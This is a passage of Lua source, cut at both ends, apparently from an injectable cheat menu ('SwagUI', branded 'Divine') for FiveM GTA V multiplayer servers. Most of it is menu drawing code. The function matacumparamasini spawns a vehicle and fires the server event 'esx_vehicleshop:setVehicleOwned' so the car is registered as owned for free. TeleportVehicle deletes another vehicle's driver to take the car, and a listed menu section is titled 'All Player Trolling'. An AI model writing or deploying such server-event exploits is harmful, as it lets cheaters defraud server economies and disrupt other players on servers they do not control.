			DrawSprite("helicopterhud", "hud_outline_thin", x - frameWidth+(xpx*2), menus[currentMenu].y + titleHeight - buttonHeight + separatorHeight*2, menuWidth+frameWidth+(xpx*10), titleHeight - buttonHeight + separatorHeight*4, 0.0, 0, 104, 222, 255)
			--DrawSpriteScaled("mpinventory", "mp_specitem_coke", x, y, menuWidth, buttonHeight + (separatorHeight*2), 0.0, 225, 225, 225, 255 ) -- rgb(26, 188, 156)
			--textureDict, textureName, screenX, screenY, width, height, heading, red, green, blue, alpha
			
			drawText(
				menus[currentMenu].branding,
				menus[currentMenu].x + menuWidth/2,
				y - buttonHeight*3.25,
				buttonFont,
				{ r = 0, g = 104, b = 222, a = 255 },
				1.5,
				true, true, false
			)
			
			--menus[currentMenu].titleColor
			-----------------------------'
			
			if notifyBody.footerYOffset ~= offset then
				notifyBody.footerYOffset = offset
				NotifyRecalibrate()
			end
		end
	end
end

local function drawButton(text, subText, color, subcolor)
	local x = menus[currentMenu].x + menuWidth / 2
	local multiplier = nil
	local pointer = true

	if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
		multiplier = optionCount
	elseif
		optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and
			optionCount <= menus[currentMenu].currentOption
	 then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + 0.0025 + (buttonHeight * multiplier) - buttonHeight / 2 -- 0.0025 is the offset for the line under subTitle
		local backgroundColor = nil
		local textColor = nil
		local subTextColor = nil
		local shadow = false
		
		local xoff = 0.0

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = color or menus[currentMenu].menuFocusTextColor
			pointColor = { r = 255, g = 255, b = 255, a = 255 }--menus[currentMenu].menuFocusPointerColor
			subTextColor = subcolor or menus[currentMenu].menuSubTextColor
			selectionColor = { r = 255, g = 255, b = 255, a = 255 }
			xoff = 0.0015
			if subText == "isMenu" then
				xoff = 0.01
			end
		else
			backgroundColor = menus[currentMenu].menuBackgroundColor
			textColor = color or menus[currentMenu].menuTextColor
			pointColor = menus[currentMenu].menuInvisibleColor
			subTextColor = subcolor or menus[currentMenu].menuSubTextColor
			selectionColor = menus[currentMenu].menuInvisibleColor
			--shadow = true
		end

		drawRect(x, y, menuWidth, buttonHeight, backgroundColor)
		DrawSpriteScaled("digitaloverlay", "nscuzz3", x, y+0.003, menuWidth, buttonHeight-0.003, 0.0, 255, 255, 255, 45 ) -- rgb(26, 188, 156)
		--[[
		if (text ~= "~b~Menu Settings") and menus[currentMenu].subTitle == "MAIN MENU" then -- and subText == "isMenu"
			drawText(
				text,
				menus[currentMenu].x + 0.020,
				y - (buttonHeight / 2) + buttonTextYOffset,
				buttonFont,
				textColor,
				buttonScale,
				false,
				shadow
			)

			if text == "Player" then
				-- w/h = 0.02
				DrawSpriteScaled("mpinventory", "mp_specitem_ped", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 225, 225, 225, 255 ) -- rgb(26, 188, 156)
			elseif text == "Player List" then
				DrawSpriteScaled("mpinventory", "team_deathmatch", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 52, 152, 219, 255) -- rgb(52, 152, 219)
			elseif text == "Visual" then
				DrawSpriteScaled("mpinventory", "mp_specitem_weed", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 25, 220, 50, 255) -- rgb(236, 240, 241)
			elseif text == "Teleporting" then
				DrawSpriteScaled("mpinventory", "darts", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 241, 196, 0, 255) -- rgb(241, 196, 15)
			elseif text == "Vehicle" then
				DrawSpriteScaled("mpinventory", "mp_specitem_bike", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 230, 126, 34, 255) -- rgb(230, 126, 34)
			elseif text == "Weapons" then
				DrawSpriteScaled("mpinventory", "mp_specitem_weapons", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 231, 76, 60, 255) -- rgb(231, 76, 60)
			elseif text == "Triggers" then
				DrawSpriteScaled("mpinventory", "mp_specitem_cash", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 255, 120, 255, 255) -- rgb(155, 89, 182)
			elseif text == "All Player Trolling" then
				DrawSpriteScaled("mpinventory", "deathmatch", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 150, 95, 240, 255) -- rgb(155, 89, 182)
			elseif text == "Unload Menu" then
				DrawSpriteScaled("mpinventory", "mp_specitem_plane", menus[currentMenu].x + buttonSpriteXOffset, y, buttonSpriteScale.x, buttonSpriteScale.y, 0.0, 225, 225, 225, 255) -- rgb(155, 89, 182)
			end
		else
		]]
		
		--end
		
		if subText ~= "isMenu" then
			drawText(
				text,
				menus[currentMenu].x + buttonTextXOffset,
				y - (buttonHeight / 2) + buttonTextYOffset,
				buttonFont,
				textColor,
				buttonScale,
				false,
				shadow
			)
		end

		if subText == "isMenu" then
			drawText(
				text,
				menus[currentMenu].x + buttonTextXOffset + xoff,
				y - (buttonHeight / 2) + buttonTextYOffset,
				buttonFont,
				textColor,
				buttonScale,
				false,
				shadow,
				false
			)
			
			DrawSpriteScaled("hunting", "huntingwindarrow_32", menus[currentMenu].x+0.0075, y+0.0008, 0.0075, nil, 90.0, pointColor.r, pointColor.g, pointColor.b, pointColor.a)
			-- menus[currentMenu].title = ""
		elseif subText == "toggleOff" then
			x = x + menuWidth / 2 - frameWidth / 2 - toggleOuterWidth / 2 - buttonTextXOffset
			y = y - buttonHeight / 2 + buttonTextYOffset
			--local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
			drawText("~r~OFF", x, y, buttonFont, subTextColor, buttonScale, false, true, true)
			
			--drawText("~r~OFF", x, y, buttonFont, subTextColor, buttonScale, false, true, true)
			--drawRect(x, y, toggleOuterWidth, toggleOuterHeight, menus[currentMenu].buttonSubBackgroundColor)
			-- drawRect(x, y, toggleInnerWidth, toggleInnerHeight, {r = 90, g = 90, b = 90, a = 230})
		elseif subText == "toggleOn" then
			x = x + menuWidth / 2 - frameWidth / 2 - toggleOuterWidth / 2 - buttonTextXOffset
			y = y - buttonHeight / 2 + buttonTextYOffset
			--drawRect(x, y, toggleOuterWidth, toggleOuterHeight, menus[currentMenu].buttonSubBackgroundColor)
			
			drawText("~g~ON", x, y, buttonFont, subTextColor, buttonScale, false, true, true)
			--drawRect(x, y, toggleInnerWidth, toggleInnerHeight, menus[currentMenu].buttonSubBackgroundColor)
			--DrawSpriteScaled("commonmenu", "shop_tick_icon", x, y, 0.020, nil, 0.0, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b, 255)
			--drawRect(x, y, toggleInnerWidth, toggleInnerHeight, _menuColor.base) -- 26, 188, 156, 255
		elseif subText == "danger" then
			DrawSpriteScaled("commonmenu", "mp_alerttriangle", x + menuWidth / 2.35, y, 0.021, nil, 0.0, 255, 255, 255, 255)
		elseif subText then			
			drawText(
				subText,
				menus[currentMenu].x + 0.005,
				y - buttonHeight / 2 + buttonTextYOffset,
				buttonFont,
				subTextColor,
				buttonScale,
				false,
				shadow,
				true
			)

		end

	end
end

local function drawComboBox(text, selectedIndex)
	local x = menus[currentMenu].x + menuWidth / 2
	local multiplier = nil
	local pointer = true

	if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
		multiplier = optionCount
	elseif
		optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and
			optionCount <= menus[currentMenu].currentOption
	 then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + 0.0025 + (buttonHeight * multiplier) - buttonHeight / 2 -- 0.0025 is the offset for the line under subTitle
		
		local backgroundColor = menus[currentMenu].menuBackgroundColor
		local textColor = menus[currentMenu].menuTextColor
		local subTextColor = menus[currentMenu].menuSubTextColor
		local pointColor = menus[currentMenu].menuInvisibleColor
		
		local textX = x + menuWidth / 2 - frameWidth - buttonTextXOffset
		local selected = false
	
		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			--subTextColor = _menuColor.base
			pointColor = menus[currentMenu].menuSubTextColor
			--textX = x + menuWidth / 2.25 - 0.019
			selected = true
		end

		-- Button background
		drawRect(x, y, menuWidth, buttonHeight, backgroundColor)

		-- Button title
		drawText(
			text,
			menus[currentMenu].x + buttonTextXOffset,
			y - (buttonHeight / 2) + buttonTextYOffset,
			buttonFont,
			textColor,
			buttonScale,
			false
		)
		
		-- DrawSpriteScaled("mparrow", "mp_arrowlarge", x + menuWidth / 2.25, y, 0.008, nil, 0.0, pointColor.r, pointColor.g, pointColor.b, pointColor.a)			

		DrawSpriteScaled("pilotschool", "hudarrow", x + menuWidth / 2 - frameWidth / 2 - sliderWidth*1.25, y + separatorHeight / 2, 0.008, nil, 90.0, pointColor.r, pointColor.g, pointColor.b, pointColor.a)
		--DrawSpriteScaled("pilotschool", "hudarrow", x + menuWidth / 2.25, y + separatorHeight / 2, 0.008, nil, -90.0, pointColor.r, pointColor.g, pointColor.b, pointColor.a)
		
		-- Selection Text
		drawText(
			selectedIndex,
			x, -- fucked
			y - (buttonHeight/2) + buttonTextYOffset,
			buttonFont,
			subTextColor,
			buttonScale,
			false,
			true,
			true
		)	

	end
end

-- Invokes NotifyNewThread
function SwagUI.SendNotification(options)
	local InvokeNotification = function() return NotifyNewThread(options) end
	-- Delegate coroutine
	CreateThread(InvokeNotification) 
end

function SwagUI.CreateMenu(id, title)
	-- Default settings
	menus[id] = {}
	menus[id].title = title
	menus[id].subTitle = "MAIN Features"
	menus[id].branding = "Divine"

	menus[id].visible = false

	menus[id].previousMenu = nil

	menus[id].aboutToBeClosed = false

	menus[id].x = 0.15
    menus[id].y = 0.19
    
    menus[id].width = menuWidth

	menus[id].currentOption = 1
	menus[id].storedOption = 1 -- This is used when going back to previous menu
	menus[id].maxOptionCount = 10
	menus[id].titleFont = 4
	menus[id].titleColor = {r = 180, g = 90, b = 70, a = 255}
	menus[id].background = "default"
	menus[id].titleBackgroundColor = {r = _menuColor.base.r, g = _menuColor.base.g, b = _menuColor.base.b, a = 180}

	
	menus[id].menuTextColor = {r = 255, g = 255, b = 255, a = 255}
	menus[id].menuSubTextColor = {r = 255, g = 255, b = 255, a = 255}
	menus[id].menuFocusTextColor = {r = 255, g = 255, b = 255, a = 255}
	menus[id].menuFocusBackgroundColor = { r = 0, g = 104, b = 222, a = 255 } -- rgb(31, 32, 34) rgb(155, 89, 182) #9b59b6
	--0, 104, 222
	menus[id].menuFocusPointerColor = {r = 255, g = 255, b = 255, a = 128}

	menus[id].menuBackgroundColor = {r = 35, g = 35, b = 35, a = 255} -- #121212
	menus[id].menuFrameColor = { r = 10, g = 10, b = 10, a = 255 }
	menus[id].menuInvisibleColor = { r = 0, g = 0, b = 0, a = 0 }

	menus[id].buttonSubBackgroundColor = {r = 25, g = 25, b = 25, a = 255}

	menus[id].subTitleBackgroundColor = {
		r = menus[id].menuBackgroundColor.r,
		g = menus[id].menuBackgroundColor.g,
		b = menus[id].menuBackgroundColor.b,
		a = 255
	}

	menus[id].buttonPressedSound = {name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"} --
end

function SwagUI.CreateSubMenu(id, parent, subTitle)
	if menus[parent] then
		SwagUI.CreateMenu(id, menus[parent].title)

		if subTitle then
			setMenuProperty(id, "subTitle", string.upper(subTitle))
		else
			setMenuProperty(id, "subTitle", string.upper(menus[parent].subTitle))
		end

		setMenuProperty(id, "previousMenu", parent)

		setMenuProperty(id, "x", menus[parent].x)
		setMenuProperty(id, "y", menus[parent].y)
		setMenuProperty(id, "maxOptionCount", menus[parent].maxOptionCount)
		setMenuProperty(id, "titleFont", menus[parent].titleFont)
		setMenuProperty(id, "titleColor", menus[parent].titleColor)
		setMenuProperty(id, "titleBackgroundColor", menus[parent].titleBackgroundColor)
		setMenuProperty(id, "titleBackgroundSprite", menus[parent].titleBackgroundSprite)
		setMenuProperty(id, "menuTextColor", menus[parent].menuTextColor)
		setMenuProperty(id, "menuSubTextColor", menus[parent].menuSubTextColor)
		setMenuProperty(id, "menuFocusTextColor", menus[parent].menuFocusTextColor)
		setMenuProperty(id, "menuFocusBackgroundColor", menus[parent].menuFocusBackgroundColor)
		setMenuProperty(id, "menuBackgroundColor", menus[parent].menuBackgroundColor)
		setMenuProperty(id, "subTitleBackgroundColor", menus[parent].subTitleBackgroundColor)
		
		setMenuProperty(id, "buttonSubBackgroundColor", menus[parent].buttonSubBackgroundColor)
	end
end

function SwagUI.CurrentMenu()
	return currentMenu
end

function SwagUI.OpenMenu(id)
	if id and menus[id] then
		if menus[id].titleBackgroundSprite then
			RequestStreamedTextureDict(menus[id].titleBackgroundSprite.dict, false)
			while not HasStreamedTextureDictLoaded(menus[id].titleBackgroundSprite.dict) do
				Citizen.Wait(0)
			end
		end
		
		setMenuVisible(id, true)
		--PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
	end
end

function SwagUI.IsMenuOpened(id)
	return isMenuVisible(id)
end

function SwagUI.IsAnyMenuOpened()
	for id, _ in pairs(menus) do
		if isMenuVisible(id) then
			return true
		end
	end

	return false
end

function SwagUI.IsMenuAboutToBeClosed()
	if menus[currentMenu] then
		return menus[currentMenu].aboutToBeClosed
	else
		return false
	end
end

function SwagUI.CloseMenu()
	if menus[currentMenu] then
		if menus[currentMenu].aboutToBeClosed then
			menus[currentMenu].aboutToBeClosed = false
			setMenuVisible(currentMenu, false)
			--PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			optionCount = 0
			currentMenu = nil
			currentKey = nil
		else
			menus[currentMenu].aboutToBeClosed = true
		end
	end
end

function SwagUI.Button(text, subText, color, subcolor)

	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawButton(text, subText, color, subcolor)

		if isCurrent then
			if currentKey == keys.select then
				--PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				return true
			end
		end

		return false
	end

end

-- Button with a slider
function SwagUI.Slider(text, items, selectedIndex, callback, vehicleMod)
	local itemsCount = #items
	local selectedItem = items[selectedIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if vehicleMod then
		selectedIndex = selectedIndex + 2
	end

	if itemsCount > 1 and isCurrent then
		selectedItem = tostring(selectedItem)
	end

	if SwagUI.SliderInternal(text, items, itemsCount, selectedIndex) then
		callback(selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
            if selectedIndex > 1 then selectedIndex = selectedIndex - 1 end
		elseif currentKey == keys.right then
            if selectedIndex < itemsCount then selectedIndex = selectedIndex + 1 end
		end
	end
	
	callback(selectedIndex)
	return false
end

function matacumparamasini()
	local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
	local NewPlate = KeyboardInput("Enter Vehicle Licence Plate", "", 100)

	if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
		RequestModel(ModelName)
	while not HasModelLoaded(ModelName) do
		Citizen.Wait(0)
	end

	local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId(-1)), GetEntityHeading(PlayerPedId(-1)), true, true)
		SetVehicleNumberPlateText(veh, NewPlate)
	local vehProps = ESX.Game.GetVehicleProperties(veh)
		TriggerServerEvent("esx_vehicleshop:setVehicleOwned", vehProps)
		SwagUI.SendNotification({text = "~g~Success", type = "error"})
	else
		SwagUI.SendNotification({text = "~r~Model Not Valid", type = "success"})
	end
end

local function drawButtonSlider(text, items, itemsCount, selectedIndex)
	local x = menus[currentMenu].x + menuWidth / 2
	local multiplier = nil

	if (menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount) and (optionCount <= menus[currentMenu].maxOptionCount) then
		multiplier = optionCount
	elseif (optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount) and (optionCount <= menus[currentMenu].currentOption) then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + separatorHeight + (buttonHeight * multiplier) - buttonHeight / 2 -- 0.0025 is the offset for the line under subTitle
		
		local backgroundColor = menus[currentMenu].menuBackgroundColor
		local textColor = menus[currentMenu].menuTextColor
		local subTextColor = menus[currentMenu].menuSubTextColor
		local shadow = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			subTextColor = menus[currentMenu].menuFocusTextColor
		end

		local sliderColorBase = menus[currentMenu].buttonSubBackgroundColor
		local sliderColorKnob = {r = 0, g = 132, b = 255, a = 200}
		local sliderColorText = {r = 255, g = 255, b = 255, a = 200}

		--[[if selectedIndex > 1 then
			sliderColorBase = {r = _menuColor.base.r, g = _menuColor.base.g, b = _menuColor.base.b, a = 50}
			sliderColorKnob = {r = _menuColor.base.r, g = _menuColor.base.g, b = _menuColor.base.b, a = 140}
			sliderColorText = {r = _menuColor.base.r + 20, g = _menuColor.base.g + 20, b = _menuColor.base.b + 20, a = 255}
		end ]]

		local sliderOverlayWidth = sliderWidth / (itemsCount - 1)
		
		-- Button
		drawRect(x, y, menuWidth, buttonHeight, backgroundColor) -- Button Rectangle -2.15
		DrawSpriteScaled("digitaloverlay", "nscuzz3", x, y+0.003, menuWidth, buttonHeight-0.003, 0.0, 255, 255, 255, 45 ) -- rgb(26, 188, 156)

		-- Button text
		drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow) -- Text

		
		-- Slider left
        drawRect(x + menuWidth / 2 - frameWidth / 2 - buttonTextXOffset - sliderWidth / 2, y, sliderWidth, sliderHeight, sliderColorBase)
		-- Slider right
		--drawRect(x + menuWidth / 2 - frameWidth / 2 - buttonTextXOffset - (sliderOverlayWidth / 2) * (itemsCount - selectedIndex), y, sliderOverlayWidth * (itemsCount - selectedIndex), sliderHeight, menus[currentMenu].buttonSubBackgroundColor)
		-- Slider knob
		drawRect(x + menuWidth / 2 - frameWidth / 2 - buttonTextXOffset - sliderWidth + (sliderOverlayWidth * (selectedIndex - 1)), y, knobWidth, knobHeight, sliderColorKnob)

		-- Slider value text
		drawText(items[selectedIndex], x + menuWidth / 2 - frameWidth / 2 - buttonTextXOffset - sliderWidth / 2, y + separatorHeight / 2 - (buttonHeight / 2) + (sliderFontHeight/4) - .001, buttonFont, sliderColorText, sliderFontScale, true, shadow) -- Current Item Text
	end
end

function SwagUI.SliderInternal(text, items, itemsCount, selectedIndex)
	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawButtonSlider(text, items, itemsCount, selectedIndex)

		if isCurrent then
			if currentKey == keys.select then
				--PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
				--PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		
		return false
	end
end

function SwagUI.MenuButton(text, id)
	if menus[id] then
		if SwagUI.Button(text, "isMenu") then
			setMenuVisible(id, true)
			return true
		end
	end

	return false
end

function SwagUI.CheckBox(text, bool, callback)
	local checked = "toggleOff"
	if bool then
		checked = "toggleOn"
	end

	if SwagUI.Button(text, checked) then
		bool = not bool

		if callback then callback(bool) end

		return true
	end

	return false
end

function SwagUI.ComboBoxInternal(text, selectedIndex)
	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawComboBox(text, selectedIndex)

		if isCurrent then
			if currentKey == keys.select then
				--PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
				--PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		
		return false
	end
end

function SwagUI.ComboBox(text, items, selectedIndex, callback, vehicleMod)
	local itemsCount = #items
	local selectedItem = items[selectedIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if vehicleMod then
		selectedIndex = selectedIndex + 1
		selectedItem = items[selectedIndex]
	end


	if itemsCount > 1 and isCurrent then
		selectedItem = tostring(selectedItem)
	end

	if SwagUI.ComboBoxInternal(text, selectedItem) then
		callback(selectedIndex, selectedItem)
		return true
	end

	if isCurrent then
		if currentKey == keys.left then
			if selectedIndex > 1 then selectedIndex = selectedIndex - 1 end
		elseif currentKey == keys.right then
			if selectedIndex < itemsCount then selectedIndex = selectedIndex + 1 end
		end
	end

	callback(selectedIndex, selectedItem)

	return false
end

function SwagUI.DrawVehiclePreview(vehClass)
	local previewX = menus[currentMenu].x - frameWidth / 2
	local previewY = menus[currentMenu].y + titleHeight / 2 + previewWidth
	local class = VehicleClass[vehClass]
	local index = menus[currentMenu].currentOption
	
	if class and index then
		RequestStreamedTextureDict(class[index][2])
		if HasStreamedTextureDictLoaded(class[index][2]) then
			drawRect((previewX - previewWidth / 2) - frameWidth, previewY + 0.005, previewWidth + 0.005, (0.1 * aspectRatio) / 2 + 0.01, menus[currentMenu].menuFrameColor)
			DrawSpriteScaled(class[index][2], class[index][3] or class[index][1], (previewX - previewWidth / 2) - frameWidth, previewY + 0.005, previewWidth, nil, 0.0, 255, 255, 255, 255)
		end
	end
end

function SwagUI.Display()
	if isMenuVisible(currentMenu) then
		if menus[currentMenu].aboutToBeClosed then
			SwagUI.CloseMenu()
		else
			SetScriptGfxDrawOrder(15)
			-- drawTitle()
			drawSubTitle()
			drawFooter()

			currentKey = nil

			if IsDisabledControlJustPressed(0, keys.down) then
				--PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption < optionCount then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
				else
					menus[currentMenu].currentOption = 1
				end
			elseif IsDisabledControlJustPressed(0, keys.up) then
				--PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption > 1 then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
				else
					menus[currentMenu].currentOption = optionCount
				end
			elseif IsDisabledControlJustPressed(0, keys.left) then
				currentKey = keys.left
			elseif IsDisabledControlJustPressed(0, keys.right) then
				currentKey = keys.right
			elseif IsDisabledControlJustPressed(0, keys.select) then
				currentKey = keys.select
			elseif IsDisabledControlJustPressed(0, keys.back) then
				if menus[menus[currentMenu].previousMenu] then
					--PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
					setMenuVisible(menus[currentMenu].previousMenu, true, true)
				else
					SwagUI.CloseMenu()
				end
			end

			optionCount = 0
		end
	end
end

function SwagUI.SetMenuWidth(id, width)
	setMenuProperty(id, "width", width)
end

function SwagUI.SetMenuX(id, x)
	setMenuProperty(id, "x", x)
end

function SwagUI.SetMenuY(id, y)
	setMenuProperty(id, "y", y)
end

function SwagUI.SetMenuMaxOptionCountOnScreen(id, count)
	setMenuProperty(id, "maxOptionCount", count)
end

function SwagUI.SetTitleColor(id, r, g, b, a)
	setMenuProperty(id, "titleColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a})
end

function SwagUI.SetTitleBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"titleBackgroundColor",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a}
	)
end

function SwagUI.SetTitleBackgroundSprite(id, textureDict, textureName)
	setMenuProperty(id, "titleBackgroundSprite", {dict = textureDict, name = textureName})
end

function SwagUI.SetSubTitle(id, text)
	setMenuProperty(id, "subTitle", string.upper(text))
end

function SwagUI.SetMenuBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"menuBackgroundColor",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a}
	)
end

function SwagUI.SetMenuTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a})
end

function SwagUI.SetMenuSubTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuSubTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a})
end

function SwagUI.SetMenuFocusColor(id, r, g, b, a)
	setMenuProperty(id, "menuFocusColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a})
end

function SwagUI.SetMenuButtonPressedSound(id, name, set)
	setMenuProperty(id, "buttonPressedSound", {["name"] = name, ["set"] = set})
end

local function DrawText3D(x, y, z, text, r, g, b)
	SetDrawOrigin(x, y, z, 0)
	SetTextFont(7)
	SetTextProportional(0)
	SetTextScale(0.0, 0.20)
	SetTextColour(r, g, b, 255)
	SetTextDropshadow(0, 0, 0, 0, 255)
	SetTextEdge(2, 0, 0, 0, 150)
	SetTextDropShadow()
	SetTextOutline()
	SetTextEntry("STRING")
	SetTextCentre(1)
	AddTextComponentString(text)
	EndTextCommandDisplayText(0.0, 0.0)
	ClearDrawOrigin()
end

local function DrawText3DFill(x, y, z, text, r, g, b)
	SetDrawOrigin(x, y, z, 0)
	SetTextFont(7)
	SetTextProportional(0)
	SetTextScale(0.0, 0.20)
	SetTextColour(r, g, b, 255)
	SetTextDropshadow(0, 0, 0, 0, 255)
	SetTextEdge(2, 0, 0, 0, 150)
	SetTextDropShadow()
	SetTextOutline()
	SetTextEntry("STRING")
	SetTextCentre(1)
	AddTextComponentString(text)
	EndTextCommandDisplayText(0.0, 0.0)
	ClearDrawOrigin()
end

function math.round(num, numDecimalPlaces)
	return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
end

local function RGBRainbow(frequency)
	local result = {}
	local curtime = GetGameTimer() / 1000

	result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
	result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
	result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

	return result
end

SliderOptions.TorqueBoost = {
	Selected = 1,
	Values = { 0.0, 2.0, 4.0, 10.0, 512.0, 9999.0 },
	Words = { "OFF", "2.0", "4.0", "10.0", "512.0", "9999.0" },
}


function teleport_to_coords(x, y, z)
	if tp_take_veh then
		SetPedCoordsKeepVehicle(PlayerPedId(), x,y,z)
	else
		SetEntityCoords(PlayerPedId(), vector3(x, y, z))
	end
end

local function TeleportToWaypoint()
	local WaypointHandle = GetFirstBlipInfoId(8)

  	if DoesBlipExist(WaypointHandle) then
  		local waypointCoords = GetBlipInfoIdCoord(WaypointHandle)
		for height = 1, 1000 do
			teleport_to_coords(waypointCoords["x"], waypointCoords["y"], height + 0.0)

			local foundGround, zPos = GetGroundZFor_3dCoord(waypointCoords["x"], waypointCoords["y"], height + 0.0)

			if foundGround then
				teleport_to_coords(waypointCoords["x"], waypointCoords["y"], height + 0.0)

				break
			end

			Citizen.Wait(0)
		end
	else
		SwagUI.SendNotification({text = "You must place a waypoint", type = 'error'})
	end
end 

function TeleportVehicle()
	local playerPed = GetPlayerPed(-1)
	local playerPedPos = GetEntityCoords(playerPed, true)
	local NearestVehicle = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 4)
	local NearestVehiclePos = GetEntityCoords(NearestVehicle, true)
	local NearestPlane = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 16384)
	local NearestPlanePos = GetEntityCoords(NearestPlane, true)
	SwagUI.SendNotification({text = "~y~Wait..", type = "error"})
	Citizen.Wait(1000)
	if (NearestVehicle == 0) and (NearestPlane == 0) then
	  SwagUI.SendNotification({text = "~r~No Vehicle Found", type = "error"})
	elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
	  if IsVehicleSeatFree(NearestPlane, -1) then
		SetPedIntoVehicle(playerPed, NearestPlane, -1)
		SetVehicleAlarm(NearestPlane, false)
		SetVehicleDoorsLocked(NearestPlane, 1)
		SetVehicleNeedsToBeHotwired(NearestPlane, false)
	  else
		local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
		ClearPedTasksImmediately(driverPed)
		SetEntityAsMissionEntity(driverPed, 1, 1)
		DeleteEntity(driverPed)
		SetPedIntoVehicle(playerPed, NearestPlane, -1)
		SetVehicleAlarm(NearestPlane, false)
		SetVehicleDoorsLocked(NearestPlane, 1)
		SetVehicleNeedsToBeHotwired(NearestPlane, false)
	  end
	  SwagUI.SendNotification({text = "~g~Teleported To Nearest Vehicle", type = "info"})
	elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
